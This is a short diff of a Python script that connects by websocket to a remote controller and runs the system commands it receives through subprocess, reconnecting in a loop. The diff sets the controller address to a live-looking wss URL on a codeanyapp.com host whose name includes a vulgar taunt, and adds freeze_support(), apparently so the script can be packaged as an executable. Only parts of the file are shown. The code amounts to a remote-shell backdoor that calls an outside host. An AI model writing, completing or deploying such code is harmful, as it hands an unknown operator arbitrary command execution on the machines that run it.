@@ -3,9 +3,9 @@ import time
 import socket
 import websocket
 import subprocess
-from multiprocessing import Process
+from multiprocessing import Process, freeze_support
 
-address = ""
+address = "wss://port-3000.Dick-yougotfucked.codeanyapp.com"
 
 def on_message(ws, cmd):
     """Receive system commands and execute them."""
@@ -47,6 +47,7 @@ def connect():
             continue
 
 if __name__ == "__main__":
+    freeze_support()
     while True:
         try:
             print("Creating new worker...")
